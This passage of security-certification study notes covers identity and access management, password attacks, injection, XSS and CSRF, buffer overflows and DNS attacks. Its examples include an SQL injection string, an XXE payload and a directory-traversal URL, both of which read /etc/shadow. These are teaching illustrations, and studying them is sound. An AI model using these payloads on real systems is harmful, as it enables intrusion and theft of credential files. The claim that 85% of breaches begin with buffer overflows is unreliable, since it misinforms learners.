# Identity and Access Management

-----

Identity and Access Management (IAM) Solutions
Objectives:

## 2.4 - Given a scenario, you must be able to analyze indicators of malicious activity

## 4.6 - Given a scenario, you must be able to implement and maintain identity and access

management

## Identity and Access Management (IAM) Solutions

- Identity and Access Management (IAM)
  - Ensures right individuals have right access to right resources for right reasons
  - Components

## Password Management

## Network Access Control

## Digital Identity Management

- IAM Processes
  - Identification, Authentication, Authorization, and Accounting (IAAA)
  - IAM System Processes

## Identification

- Claiming identity, e.g., username, email address

## Authentication

- Verifying user, device, or system identity

## Authorization

- Determining user permissions after authentication

## Accounting

- Tracking and recording user activities
- IAM Concepts
  - Processes

## Provisioning

## Deprovisioning

## Identity Proofing

## Interoperability

## Attestation

- Multi Factor Authentication (MFA)
  - Factors

## Something you know

## Something you have

## Something you are

## Something you do

## Somewhere you are

- Implementations

## Biometrics

## Hard tokens

## Soft tokens

## Security keys

## Passkeys

- Password Security
  - Best Practices

## Password policies

## Password managers

## Passwordless authentication

- Password Attacks
  - Types

## Spraying Attacks

## Brute Force Attacks

## Dictionary Attacks

## Hybrid Attacks

- Single Sign-On (SSO)
  - User authentication service using one set of credentials for multiple applications
  - Technologies

## LDAP

## OAuth

## SAML

- Federation
  - Sharing and using identities across multiple systems or organizations
- Privileged Access Management (PAM)
  - Involves the following

## Just-in-Time (JIT) Permissions

## Password Vaulting

## Temporal Accounts

- Access Control Models
  - Mandatory Access Control
  - Discretionary Access Control
  - Role-based Access Control
  - Rule-based Access Control
  - Attribute-based Access Control
- Assigning Permissions
  - Best practices to enhance organization security

## Identity and Access Management (IAM)

- Identity and Access Management (IAM)
  - Critical component of enterprise security, focusing on managing access to
    information
  - Ensures the right individuals have access to the right resources at the right times
    for the right reasons
- Four Main IAM Processes
  - Identification

## User claims an identity using a unique identifier (e.g., username or email

address)

## Ensures user legitimacy and accuracy of provided information

- Authentication

## Verifies the identity of a user, device, or system

## Typically involves validating user credentials against an authorized user

database

## Methods

- Passwords
- Biometrics
- Multi-factor authentication
  - Authorization

## Determines the permissions or access levels for authenticated users

## Ensures users have access only to appropriate resources

## Role-based access control often used

- Accounting (Auditing)

## Tracks and records user activities

- Logins
- Actions
- Changes

## Helps detect security incidents, identify vulnerabilities, and provide

evidence in case of breaches

- Key IAM Concepts
  - Provisioning and Deprovisioning of User Accounts

## Provisioning

- Creating new user accounts, assigning permissions, and providing
  system access

## Deprovisioning

- Removing access rights when no longer needed (e.g., when an
  employee leaves)
  - Identity Proofing

## Process of verifying a user’s identity before creating their account

## May involve checking personal details or providing identification

documents (e.g., driver’s license or passport)

- Interoperability

## Ability of different systems, devices, and applications to work together

and share information

## In IAM, it can involve using standards like SAML or OpenID Connect for

secure authentication and authorization

- Attestation

## Process of validating that user accounts and access rights are correct and

up-to-date

## Involves regular reviews and audits of user accounts and their access

rights

## Multi-factor Authentication

- Multi-factor Authentication (MFA)
  - A security system requiring multiple methods of authentication from
    independent categories of credentials
  - Enhances security by creating a layered defense against unauthorized access
- Five Categories of Authentication for MFA
  - Something You Know (Knowledge-Based Factor)

## Authentication based on information the user knows, like a password,

PIN, or answers to secret questions

- Something You Have (Possession-Based Factor)

## Authentication based on physical possession of an item

- Smart card
- Hardware token (key fob)
- Software token on a device
  - Something You Are (Inherence-Based Factor)

## Authentication based on biometric characteristics unique to individuals

- Fingerprints
- Facial recognition
- Voice recognition
  - Somewhere You Are (Location-Based Factor)

## Authentication based on the user’s location, determined through IP

address, GPS, or network connection

## Geographical location restrictions can be applied

- Something You Do (Behavior-Based Factor)

## Authentication based on recognizing unique patterns associated with

user behavior

- Keystroke patterns
- Device interaction

## Rarely used as a primary factor but can provide an additional layer of

security

- Authentication Types
  - Single Factor Authentication

## Uses one authentication factor to access a user account

- Two Factor Authentication (2FA)

## Requires two different authentication factors to gain access

- Multi-factor Authentication (MFA)

## Uses two or more factors to authenticate a user

## MFA can involve 2, 3, 4, or 5 factors depending on the chosen

configuration

- Generally, using more authentication types makes a system safer,
  but is less convenient for the end user
  - Knowledge-based factors like passwords and PINs are the most common
    authentication methods

## Password managers can generate different long, strong, and complex

passwords for each website or application

- Passkeys (Passwordless Authentication)

## An alternative to traditional passwords for authentication

## Involves creating a passkey secured by device authentication methods like

fingerprint or facial recognition

## Provides a more secure and user-friendly authentication method

## Passkeys utilize public key cryptography

## Password Security

- Password Security
  - Measures the effectiveness of a password in resisting guessing and brute-force
    attacks
  - Estimates the number of attempts needed to guess a password correctly
- Group Policy Editor for Password Policies
  - Used to create password policies in Windows
  - Available for local machines, and global policy orchestrator can be used in
    domain environments
- Five Characteristics of Password Policies
  - Password Length

## Longer passwords are harder to crack

## Strong passwords should be at least 12 to 16 characters

## Longer passwords increase security exponentially

- Password Complexity

## Combines uppercase and lowercase letters, numbers, and special

characters

## Complexity makes passwords resistant to brute force attacks

## The more character choices, the more secure the password

- Password Reuse

## Avoid using the same password for multiple accounts

## Reusing passwords increases vulnerability

- Password Expiration

## Requires users to change passwords after a specific period

## Overemphasis on expiration can lead to poor password choices

- Password Age

## Password age refers to the time a password has been in use

## Older passwords have a higher risk of being compromised

- Password Managers
  - Tools for storing and managing passwords securely
  - Features

## Password generation

- Password managers create unique strong passwords for accounts
  to prevent reuse and enhance security

## Auto-fill

- Password managers autofill login details, sparing users the need to
  recall or input information manually

## Secure sharing

- Password managers provide secure methods to share passwords
  without directly disclosing the password itself

## Cross-platform access

- Password managers offer cross-device compatibility, allowing
  access to passwords from any location or device
  - Promote password complexity, prevent reuse, and offer easy access to strong,
    unique passwords
- Passwordless Authentication Methods
  - Provide a higher level of security and better user experience
  - Methods

## Biometric Authentication

- Uses unique biological characteristics

## Hardware Token

- Generate ever-changing login codes

## One-Time Passwords (OTP)

- Sent to email or phone for one-time use

## Magic Links

- One-time links sent via email for automatic login

## Passkeys

- Rely on device screen lock for authentication

## Password Attacks

- Password Attacks
  - Methods used by attackers to crack or recover passwords
  - Types of password attacks

## Brute Force

## Dictionary

## Password Spraying

## Hybrid

- Brute Force Attack
  - Tries every possible character combination until the correct password is found
  - Effective for simple passwords but time-consuming for complex ones
  - Mitigation

## Increasing password complexity and length

## Limiting login attempts

## Using multi factor authentication

## Employing CAPTCHAS

- Dictionary Attack
  - Uses a list of commonly used passwords (a dictionary) to crack passwords
  - May include variations with numbers and symbols
  - Effective against common, easy-to-guess passwords
  - Mitigation

## Increase password complexity and length, limit login attempts, use

multifactor authentication, and employ CAPTCHAS

- Password Spraying
  - A form of brute force attack that tries a few common passwords against many
    usernames or accounts
  - Effective because it avoids account lockouts and targets weak passwords
  - Mitigation

## Use unique passwords and implement multi-factor authentication

- Hybrid Attack
  - Combines elements of brute force and dictionary attacks
  - May include variations, such as adding numbers or special characters to
    passwords
  - Can use a static dictionary or dynamically create variations
  - Effective for discovering passwords following specific patterns

## Single Sign-On (SSO)

- Single Sign-On (SSO)
  - Authentication process allowing users to access multiple applications with one
    set of credentials
  - Simplifies the user experience and enhances productivity
  - Trusted relationship between applications and Identity Providers (IdP)
- How SSO Works
  - User logs into the primary identity provider (IdP)
  - Accesses a secondary application or website configured for SSO
  - The secondary application verifies the user’s identity with the IdP’s assertion
  - Once authenticated, access to the secondary application is granted
- Benefits of SSO
  - Improved user experience
  - Increased productivity
  - Reduced IT support costs
  - Enhanced security, encouraging stronger passwords
- Protocols for SSO
  - LDAP (Lightweight Directory Access Protocol)

## Used to access and maintain distributed directory information

## Can share user information across network resources

## Supports central repository for authentication and authorization

## Can be secured using LDAPS (LDAP over SSL or StartTLS)

## LDAP stores user data for authorization, like group memberships and

roles

- OAuth (Open Authorization)

## Open standard for token-based authentication and authorization

## Allows third-party services to access user account information without

exposing passwords

## Often used in RESTful APIs for secure sharing of user profile data

- The client app or service registers with the authorization server,
  provides a redirect URL and gets an ID and secret

## Uses JSON Web Tokens (JWT) for data transfer

- SAML (Security Assertion Markup Language)

## Standard for logging users into applications based on sessions in another

context

## Redirects users to an identity provider for authentication

## Eliminates the need for services to authenticate users directly

## Decouples services from identity providers, enhancing security and

flexibility

## Federation

- Federation
  - Links electronic identities and attributes across multiple identity management
    systems
  - Enables users to use the same credentials for login across systems managed by
    different organizations
  - Based on trust relationships between systems
  - Federation extends beyond an organization’s boundaries

## Partners

## Suppliers

## Customers

- Simplifies user access to various services
- Ensures security through trust relationships between networks
- Federation Process
  - Login Initiation

## User accesses a service or application and chooses to log in

- Redirection to Identity Provider

## Service Provider (SP) redirects the user to their Identity Provider (IdP) for

authentication

- Authentication of the user

## IdP validates the user’s identity using stored credentials

## Validates the user’s identity

- Generation of Assertion

## IdP creates an assertion (token) with user identity and authentication

status in a standardized format

- Return to Service Provider

## User returns to the original service or application with the assertion from

the IdP

- Verification and Access

## Service Provider verifies the assertion and grants access based on the

information it contains

- Login Complete

## User gains access to the service or application and potentially others

within the federation without additional logins

- Benefits
  - Simplified user experience
  - Reduced administrative overhead
  - Increased security through reduced password reuse and improved management

## Privileged Access Management (PAM)

- Privileged Access Management (PAM)
  - Solution that restricts and monitors privileged access within an IT environment
  - The policies, procedures, and technical controls that are used to prevent
    malicious abuse of privileged accounts
  - Crucial for preventing data breaches and ensuring the least privileged access is
    granted for specific tasks or roles
- Components of Privileged Access Management
  - Just-In-Time Permissions (JIT Permissions)

## Security model that grants administrative access only when needed for a

specific task

## Reduces the risk of unauthorized access or misuse of privileges

## Access rights are given when the task begins and revoked once the task is

completed

- Password Vaulting

## Technique that stores and manages passwords securely, often in a digital

vault.

## Requires multi-factor authentication for accessing stored passwords

## Tracks access to privileged credentials, providing an audit trail

- Temporal Accounts

## Temporary accounts used for time-limited access to resources

## Created for specific purposes and automatically disabled or deleted after

a predefined period

## Access Control Models

- Different Types of Access Control Models
  - Mandatory Access Control (MAC)

## Uses security labels to authorize resource access

## Requires assigning security labels to both users and resources

## Access is granted only if the user’s label is equal to or higher than the

resource’s label

- Discretionary Access Control (DAC)

## Resource owners specify which users can access their resources

## Access control based on user identity, profile, or role

## Allows resource owners to grant access to specific users

- Role-Based Access Control (RBAC)

## Assigns users to roles and assigns permissions to roles

## Roles mimic the organization’s hierarchy

## Enforces minimum privileges

## Effective for managing permissions based on job roles and turnover

- Rule-Based Access Control

## Uses security rules or access control lists

## Policies can be changed quickly and frequently

## Applied across multiple users on a network segment

- Attribute-Based Access Control (ABAC)

## Considers various attributes like

- User Attributes
  - User’s name, role, organization ID, or security clearance
- Environment Attributes
  - Time of access, data location, and current organization’s
    threat level
- Resource Attributes
  - File creation date, resource owner, file name, and data
    sensitivity

## Access decisions are based on the combination of attributes

## Provides fine-grained control and dynamic access decisions

- Access Control Extensions
  - Time-of-Day Restrictions

## Limits access based on specific time periods

## Often used to complement other access control models

## Helps prevent unauthorized access during non-working hours

- Principle of Least Privilege

## Users are granted the minimum access required to perform their job

functions

## Reduces the risk of misuse or accidental damage

## Regularly review and adjust permissions to prevent authorization creep

## Assigning Permissions

- Privileges
  - Define the levels of access that users have
  - Local Administration Account

## High level of access

## Allows administrator to

- change system settings
- install softwares
- perform a variety of managerial tasks
  - Standard User Accounts

## Can’t change system settings

## Can store files in their designated area only

- Principle of Least Privilege
  - A user should only have the minimum access rights needed to perform their job
    functions and tasks, and nothing additional or extra
- Microsoft Account
  - Free online account that you can use to sign in to a variety of Microsoft services
- User Account Control (UAC)
  - A mechanism designed to ensure that actions requiring administrative rights are
    explicitly authorized by the user
  - Access is limited to what the user needs to do a job
  - Purpose is to minimize the risk of users gaining access to administrative privileges
- Access control and permissions can also apply to groups of users
- File and Folder Permissions
  - Setting permissions at the folder level applies those permissions to all files within
    that folder
  - In Windows, these file and folder permissions are accessed by

## Right-click on a file or folder

## Select ‘Properties’

## Navigate to the ‘Security’ tab

- Always ensure to only give out the necessary permissions
  Vulnerabilities and Attacks
  Objectives:

## 2.2: Explain common threat vectors and attack strategies

## 2.3: Explain various types of vulnerabilities

## 2.4: Given a scenario, you must be able to analyze indicators of malicious activity

## 2.5: Explain the purpose of mitigation techniques used to secure the enterprise

## 4.1: Given a scenario, you must be able to apply common security techniques to computing

resources

## Vulnerabilities and Attacks

- Vulnerabilities
  - Weaknesses or flaws in hardware, software, configurations, or processes
  - Consequences

## Unauthorized Access

## Data Breaches

## System Disruptions

- Attacks
  - Deliberate actions by threat actors to exploit vulnerabilities
  - Forms

## Unauthorized Access

## Data Theft

## Malware Infections

## DoS Attacks

## Social Engineering

- Hardware Vulnerabilities
  - Focus

## Firmware

## End-of-life systems

## Missing patches

## Misconfigurations

- Mitigation

## Harden systems

## Patch

## Enforce baseline configurations

## Decommission old assets

## Isolation

- Bluetooth Vulnerabilities and Attacks
  - Vulnerabilities attacks like the following

## Bluesnarfing

## Bluejacking

## Bluebugging

## Bluesmark

## Blueborne

- Mobile Vulnerabilities and Attacks
  - Topics

## Sideload

## Jailbreaking

## Insecure connections

- Mitigation

## Patch Management

## Mobile Device Management

## Prevent sideloading

## Rooting

- Zero-Day Vulnerabilities
  - Newly discovered and exploited vulnerabilities
  - Challenge

## No known defenses or mitigations

- Operating System Vulnerabilities
  - Types

## Unpatched systems

## Zero-days

## Misconfigurations

## Data exfiltration

## Malicious updates

- Protection

## Patching

## Configuration management

## Encryption

## Endpoint protection

## Firewalls

## IPS

## Access controls

- SQL and XML Injections
  - SQL Injection

## Exploits web app or database vulnerabilities

- XML Injection

## Targets XML data processing

- Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) Attacks
  - Cross-Site Scripting (XSS)

## Injects malicious scripts into web pages

- Cross-Site Request Forgery (CSRF)

## Triggers actions on different websites without user consent

- Buffer Overflows
  - Software vulnerability when more data is written to a memory buffer than it can
    hold
- Race Conditions
  - Multiple processes or threads accessing shared resources simultaneously
  - Key Terms

## Time-of-Check (TOC)

## Target-of-Evaluation (TOE)

## Time-of-Use (TOU)

## Hardware Vulnerabilities

- Hardware Vulnerabilities
  - Security flaws or weaknesses in a device’s physical components or design that
    can be exploited to compromise system integrity, confidentiality, or availability
- Types of Hardware Vulnerabilities
  - Firmware Vulnerabilities

## Specialized software stored on hardware devices

## Can grant attackers full control, leading to unauthorized access or

takeover

## Vulnerabilities due to insecure development, outdated practices, and

overlooked updates

- End-of-Life, Legacy, and Unsupported Systems

## End-of-life

- No updates or support from the manufacturer

## Legacy

- Outdated and superseded by newer alternatives

## Unsupported

- No official support, security updates, or patches

## Vulnerable due to the lack of patching and updates

- Unpatched Systems

## Devices, applications, or software without the latest security patches

## Exposed to known exploits and attacks

## Risk from oversight, negligence, or challenges in updating

- Hardware Misconfigurations

## Incorrect device settings or options

## May lead to vulnerabilities, performance issues, or unintended behavior

## Caused by oversight, lack of understanding, or deployment errors

- Mitigation Strategies
  - Hardening

## Tighten security by closing unnecessary ports, disabling services, and

setting permissions

- Patching

## Regular updates to fix known vulnerabilities in software, firmware, and

applications

- Configuration Enforcement

## Ensure devices adhere to secure configurations

- Decommissioning

## Retire end-of-life or legacy systems posing security risks

- Isolation

## Isolate vulnerable systems from the enterprise network

- Segmentation

## Divide the network into segments to limit the impact of breaches

## Bluetooth Vulnerabilities and Attacks

- Bluetooth
  - Wireless technology for short-distance data exchange
  - It’s commonly used for connecting devices but presents security challenges
  - Vulnerabilities include

## Insecure pairing

- Occurs when Bluetooth devices establish a connection without
  proper authentication

## Device spoofing

- Occurs when an attacker impersonates a device to trick a user into
  connecting

## On-path attacks

- Exploits Bluetooth protocol vulnerabilities to intercept and alter
  communications between devices without either party being
  aware
- Different Types of Bluetooth Attacks
  - Bluejacking

## Sending unsolicited messages to a Bluetooth device

## Often used for pranks or testing vulnerabilities

- Bluesnarfing

## Unauthorized access to a device to steal information like contacts, call

logs, and text messages

- Bluebugging

## Allows attackers to take control of a device’s Bluetooth functions

## Can make calls, send messages, or access the internet

- Bluesmack

## Denial-of-service attack by overwhelming a device with data, causing it to

crash or become unresponsive

- BlueBorne

## Spreads through the air to infect devices without user interaction

- Best Practices for Secure Bluetooth Usage
  - Turn off Bluetooth when not in use

## Reduces the attack surface and exposure to threats

- Set devices to “non-discoverable” mode by default

## Prevents unsolicited connection attempts

- Regularly update firmware

## Ensures security is up-to-date with patches for vulnerabilities

- Only pair with known and trusted devices

## Mitigates the risk of connecting to malicious devices

- Use a unique PIN or passkey during pairing

## Adds security during the pairing process

- Be cautious of unsolicited connection requests

## Avoid accepting requests blindly

- Use encryption for sensitive data transfers

## Scrambles data to prevent unauthorized access

## Mobile Vulnerabilities and Attacks

- Different Types of Mobile Vulnerabilities
  - Sideloading

## Installing apps from unofficial sources bypassing the device’s default app

store

## Can introduce malware; download apps from official sources with strict

review processes

## Mitigation techniques

- always download apps from an official and trusted source
  - Jailbreaking/Rooting

## Gives users escalated privileges but exposes devices to potential security

breaches

## Prevents installation of manufacturer updates, leaving devices vulnerable

- Insecure Connection Methods

## Using open Wi-Fi networks or pairing with unknown devices over

Bluetooth exposes devices to attacks

## Mitigation techniques

- Use cellular data for more secure connections
- Connect only to known devices and set devices to
  non-discoverable when not pairing
- Use long, strong, complex passwords
- Use 802.1x authentication methods
- Mobile Device Management (MDM)
  - MDM solutions minimize mobile vulnerabilities by

## Patching

- Ensuring devices receive necessary security updates

## Configuration Management

- Enforcing standardized configurations for security

## Best Practice Enforcement

- Disabling sideloading, detecting jailbreaking/rooting, and
  enforcing VPN use

## Zero-day Vulnerabilities

- Zero-day Vulnerabilities
  - Discovered or exploited before vendors issue patches
- Zero-day Exploits
  - Attacks that target previously unknown vulnerabilities
- Zero-day
  - Refer to the vulnerability, exploit, or malware that exploits the vulnerability
- Zero-Day Exploits and Value
  - Zero-day exploits are significant in the cybersecurity world and can be lucrative
  - Bug bounty hunters can earn money by discovering zero-day vulnerabilities
  - Zero-days are also sold to government agencies, law enforcement, and criminals
  - Threat actors save zero-days for high-value targets, using generic malware for
    initial attempts
  - An up-to-date antivirus can detect known vulnerabilities’ exploitation
  - Countries and nation states may stockpile zero-days for espionage and strategic
    operations

## Operating System Vulnerabilities

- Unpatched Systems
  - Lack the latest security updates, making them vulnerable
  - Attackers exploit known vulnerabilities in unpatched systems
  - To mitigate unpatched system vulnerabilities, ensure regular system updates and
    patches, either automatically or manually
- Zero-Day Vulnerabilities
  - Zero-days

## Unknown vulnerabilities to developers and attackers

- Security solutions like host-based intrusion prevention systems (IPS) can help
  detect and block suspicious activities
- Frequent system and software updates provide additional defense against
  potential zero-day exploits
- Misconfigurations
  - Occurs when system settings are improperly configured
  - Standardize and automate configuration processes with configuration
    management tools
  - Conduct periodic audits and reviews to identify and mitigate vulnerabilities due
    to misconfigurations
- Data Exfiltration
  - Involves unauthorized data transfers from an organization to an external location
  - Protect against data exfiltration with encryption for data at rest and endpoint
    protection tools
  - Endpoint protection tools can monitor and restrict unauthorized data transfers
- Malicious Updates
  - Appear as legitimate security updates but contain malware or exploits
  - Source updates from trusted vendors and official channels
  - Maintain application allow lists, verify update authenticity with digital signatures
    and hashes

## SQL and XML Injections

- Injection Attack
  - Involves sending malicious data to a system for unintended consequences
  - SQL injection and XML injection share the goal of inserting code into systems
- SQL (Structured Query Language) Injection
  - SQL Data

## Used to interact with databases

## Four main SQL actions

- Select
  - Used to read data from the database
- Insert
  - Used to write data into the database
- Delete
  - Used to remove data from the database
- Update
  - Overwrite some data in the database

## Example statement

- SELECT * FROM USERS WHERE userID = ‘Jason’ AND password =
  ‘pass123’;
  - SQL Injection

## Involves inserting malicious SQL code into input fields

## Attackers use URL parameters, form fields, cookies, POST data, or HTTP

headers for SQL injection

## Prevention

- Input validation
- Sanitize user data
- Use a web application firewall

## SQL Injection Attempt

- Involve statements like “ ‘ OR 1=1”
- Example
  - Original SQL statement

## SELECT * FROM USERS WHERE userID = ‘Jason’ AND

password = ‘pass123’;

- Injected SQL statement

## SELECT * FROM Users WHERE userID = ‘Jason’ AND

password = ‘’ OR 1=1;

- XML (Extensible Markup Language) Injection
  - XML Data

## Used for data exchange in web applications

## Should be sent within an encrypted tunnel, like TLS

## Input validation and sanitization are crucial for protection

## Appears as tagged fields

## Example

- <?xml version="1.0" encoding="UTF-8"?>

<question>
<ID>SECURITY-002-0001</ID>
<title>Is this an XML vulnerability?</title>
<choice1>Option 1</choice1>
<choice2>Option 2</choice2>
</question>
  - XML Exploits

## XML Bomb (Billion Laughs Attack)

- Consumes memory exponentially, acting like a denial-of-service
  attack

## XXE (XML External Entity) Attack

- Attempts to read local resources, like password hashes in the
  shadow file
- Example
  - <?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [
<!ELEMENT foo ANY>

<!ENTITY xxe SYSTEM "file:///etc/shadow">

]>
<foo>Some data</foo>

- Prevention

## Implement proper input validation

## XSS and XSRF

- Cross-Site Scripting (XSS)
  - Injects a malicious script into a trusted site to compromise the site’s visitors
  - Goal

## Have visitors run a malicious script so your system will process it,

bypassing the normal security mechanisms

- Mitigate the threat with proper input validation
- Four steps to an XSS attack

## The attacker identifies an input validation vulnerability within a trusted

website

## The attacker crafts a URL to perform a code injection against the trusted

website

## The trusted site will return a page containing the malicious code injected

## The malicious code runs in the client’s browser with permission level as

the trusted site

- Functions of a XSS Attack

## Defacing the trusted website

## Stealing the user’s data

## Intercepting data or communications

- Types of XSS Attacks

## Non-Persistent XSS

- A XSS attack that only occurs when it is launched and only
  happens once
- Server executes the attack (Server-side scripting attack)

## Persistent XSS

- Allows an attacker to insert code into a backend database used by
  that trusted website
- Server executes the attack (Server-side scripting attack)

## Document Object Model (DOM) XSS

- Exploits the client’s web browser using client-side scripts to
  modify the content and layout of the web page
- Client’s device executes the attack (Client-side scripting attack)
- Can be used to change the DOM environment
- Runs using the logged in user’s privileges on the local system
- Session Management
  - Enables web applications to uniquely identify a user across several different
    actions and requests
  - Fundamental security component in modern web applications
  - Cookie Tracking

## Cookie

- Text file used to store information about a user when they visit a
  website
- Non-persistent cookies
  - Also known as a session cookie
  - Resides in memory and are used for a very short time
    period
  - Deleted at the end of the session
- Persistent cookies
  - Stored in the browser cache until either deleted by a user
    or expire
  - Session Hijacking

## Type of spoofing attack where the attacker disconnects a host and then

replaces it with his or her own machine by spoofing the original host IP

## Session Prediction

- Type of spoofing attack where the attacker attempts to predict the
  session token in order to hijack the session
- Prevent these attacks by using a non-predictable algorithm to
  generate session tokens
- XSRF
  - Malicious script is used to exploit a session started on another site within the
    same web browser
  - Can be disguised

## Can use tags, images, and other HTML code

- Doesn’t need victim to click on a link
- Prevention

## Use user-specific tokens in all form submissions

## Add randomness and prompt for additional information whenever a user

tries to reset their password

- Require two-factor authentication

## Require users to enter their current password when changing their

password

## Buffer Overflow

- Buffer Overflow Attack
  - Occurs when a process stores data outside the memory range allocated by the
    developer
  - Common initial attack vector in data breaches

## 85% of data breaches used buffer overflow as the initial vector

- Attackers exploit the excess data written beyond buffer boundaries to
  manipulate program execution
- Buffers
  - Temporary storage areas used by programs to hold data
  - They have a defined memory capacity, just like a glass holding a limited amount
    of water
  - Overflowing a buffer results in data spilling into adjacent memory locations,
    causing unintended consequences
- Technical Aspects
  - Stack

## Programs have a reserved memory area called a stack to store data during

processing

- The stack uses a “first in, last out” organization
- Stack contains return addresses when a function call instruction is received
- Attackers aim to overwrite the return address with their malicious code’s address
- Smashing the Stack
  - Attackers aim to overwrite the return address with a pointer to their malicious
    code
  - When the non-malicious program hits the modified return address, it runs the
    attacker’s code
  - This gives attackers a command prompt on the victim’s system for remote code
    execution
- NOP Slide
  - Attackers fill the buffer with NOP (No-Operation) instructions
  - The return address slides down the NOP instructions until it reaches the
    attacker’s code
- Mitigations against Buffer Overflow Attack
  - Address Space Layout Randomization (ASLR)

## Helps prevent attackers from guessing return pointer addresses

## Randomizes memory addresses used by well-known programs, making it

harder to predict the location of the attacker’s code

## Race Conditions

- Race Conditions
  - Software vulnerabilities related to the order and timing of events in concurrent
    processes
  - Exploiting race conditions allows attackers to disrupt intended program behavior
    and gain unauthorized access
- Understanding Race Conditions
  - Race conditions occur when multiple threads or processes access and manipulate
    shared resources simultaneously
  - Dereferencing

## Software vulnerability that occurs when the code attempts to remove the

relationship between a pointer and the thing that the pointer was
pointing to in the memory which allows changes to be made

- Vulnerabilities stem from unexpected conflicts and synchronization issues
- Exploiting Race Conditions
  - Attackers exploit race conditions by timing their actions to coincide with
    vulnerable code execution
  - Exploitation may lead to unauthorized access, data manipulation, or system
    crashes
- Dirty COW Exploit
  - A real-world example of race condition exploitation
  - Targeted Linux and Android systems, leveraging race conditions in the Copy On
    Write function
- Types of Race Conditions
  - Time-of-Check (TOC)

## Attackers manipulate a resource’s state after it is checked but before it is

used

## For example, overdrawing a bank account due to a time delay between

checking and transferring funds

- Time-of-Use (TOU)

## Attackers alter a resource’s state after it is checked but before it is used

## Focuses on the time when the resource is utilized, rather than the time of

the initial check

- Time-of-Evaluation (TOE)

## Attackers manipulate data or resources during the system’s

decision-making or evaluation process

## Can lead to incorrect results or unexpected behavior

- Mitigating Race Conditions
  - Use locks and mutexes to synchronize access to shared resources

## Mutex

- Mutually exclusive flag that acts as a gatekeeper to a section of
  code so that only one thread can be processed at a time
- Mutexes ensure only one thread or process can access a specific
  section of code at a time
  - Properly design and test locks to prevent deadlocks
  - Deadlock

## Occurs when a lock remains in place because the process it’s waiting for is

terminated, crashes, or doesn’t finish properly, despite the processing
being complete
Malicious Activity
Objective 2.4: Given a scenario, you must be able to analyze indicators of malicious activity

## Malicious Activity

- Malicious Activity
  - Constantly evolving threats in the digital age
  - Concerns

## Cyber attacks, increasing in frequency and sophistication

- Purpose

## Delve into cyber threats, types, mechanisms, and impacts

- Understanding Cyber Threats
  - Importance

## First step to effective prevention and mitigation

- Insights

## Tactics, techniques, and procedures employed by cybercriminals

- Distributed Denial of Service (DDoS) Attacks
  - Variants

## Denial of Service

## Amplified DDoS

## Reflected DDoS

- Domain Name Server (DNS) Attacks
  - Types

## DNS Cache Poisoning

## DNS Amplification

## DNS Tunneling

## Domain Hijacking

## DNS Zone Transfer

- Directory Traversal Attacks
  - Exploiting insufficient security validation of user-supplied input file names
- Privilege Escalation Attack
  - Exploiting system vulnerability to gain elevated access
- Replay Attacks
  - Malicious or fraudulent repeat/delay of a valid data transmission
- Session Hijacking
  - Attacker takes over a user session to gain unauthorized access
- Malicious Code Injection Attacks
  - Introduction of harmful code into a program or system
- Indicators of Compromise (IoC)
  - Examples

## Account lockout

## Concurrent session usage

## Blocked content

## Impossible travel

## Resource consumption

## Inaccessibility

## Out-of-cycle logging

## Published documents indicating hacking

## Missing logs

## Distributed Denial of Service

- Denial of Service (DoS)
  - Used to describe an attack that attempts to make a computer or server’s
    resources unavailable
- Flood Attacks
  - Ping Flood

## Overloading a server with ICMP echo requests (pings)

## Often countered by blocking echo replies

- SYN Flood

## Initiating multiple TCP sessions but not completing the 3-way handshake

## Consumes server resources and prevents legitimate connections

## Countermeasures

- Flood guard
- Timeout configurations
- Intrusion prevention systems
- Permanent Denial of Service (PDOS) Attack
  - Exploits security flaws to break a networking device permanently by re-flashing
    its firmware
  - Requires a full firmware reload to bring the device back online
- Fork Bomb
  - Attack creates a large number of processes, consuming processing power
  - Not considered a worm, as it doesn’t infect programs or use the network
  - Self-replicating nature causes a denial of service condition
- Distributed Denial of Service (DDoS) attack
  - Malicious attempt to disrupt the normal functioning of a network, service, or
    website by overwhelming it with a flood of internet traffic
  - Involves multiple machines attacking a single server simultaneously.
  - Attackers often use compromised machines within a botnet
  - Techniques like DNS amplification can amplify the attack’s impact

## DNS Amplification Attack

- Specialized DDoS that allows an attacker to initiate DNS requests
  from a spoof IP address to flood a website
  - DDoS attacks aim to force the target server offline temporarily
- Surviving and Preventing DoS and DDoS Attacks
  - Black Hole or Sinkhole

## Routes attacking IP traffic to a non-existent server through a null interface

## Effective but temporary solution

- Intrusion Prevention Systems

## Can identify and respond to DoS attacks for small-scale incidents

- Elastic Cloud Infrastructure

## Scaling infrastructure when needed to handle large-scale attacks

## May result in increased costs from service providers

- Specialized Cloud Service Providers

## Providers like CloudFlare and Akamai offer DDoS protection services

## Provide web application filtering, content distribution, and robust

network defenses

## Help organizations withstand DDoS and high-bandwidth attacks

## Domain Name System (DNS) Attacks

- Domain Name System (DNS)
  - Fundamental component of the internet that is responsible for translating
    human-friendly domain names into IP addresses that computers can understand
- Some of the Various Types of DNS Attacks
  - DNS Cache Poisoning (DNS Spoofing)

## Corrupts a DNS resolver’s cache with false information

## Redirects users to malicious websites

## Mitigation

- Use DNSSEC (Domain Name System Security Extensions) to add
  digital signatures to DNS data
- Implement secure network configurations and firewalls to protect
  DNS servers
  - DNS Amplification Attacks

## Overwhelms a target system with DNS response traffic by exploiting the

DNS resolution process

## Spoofed DNS queries sent to open DNS servers

## Mitigation

- Limit the size of DNS responses
- Rate limit DNS response traffic to reduce the impact
  - DNS Tunneling

## Encapsulates non-DNS traffic (e.g., HTTP, SSH) over port 53

## Attempts to bypass firewall rules for command and control or data

exfiltration

## Mitigation

- Monitor and analyze DNS logs for unusual patterns indicating
  tunneling
  - Domain Hijacking (Domain Theft)

## Unauthorized change of domain registration

## May lead to loss of website control and redirection to malicious sites

## Mitigation

- Regularly update and secure registration account information
- Use domain registry lock services to prevent unauthorized
  changes
  - DNS Zone Transfer Attacks

## Attempts to obtain an entire DNS zone data copy

## Exposes sensitive information about a domain’s network infrastructure

## Could be used for reconnaissance in future attacks

## Directory Traversal Attack

- Directory Traversal Attack
  - An injection attack occurs when the attacker inserts malicious code through an
    application interface
  - Application attack that allows access to commands, files, and directories that
    may or may not be connected to the web document root directory

## http://diontraining.com/../../../../etc/shadow

## Unix systems use . . /

## Windows systems use . . \ by default but may also accept the Unix-like . . /

- Directory traversals may be used to access any file on a system with the right
  permissions
- WARNING
  - Attackers may use encoding to hide directory traversal attempts (%2e%2e%2f
    represents . . / )
- File Inclusion
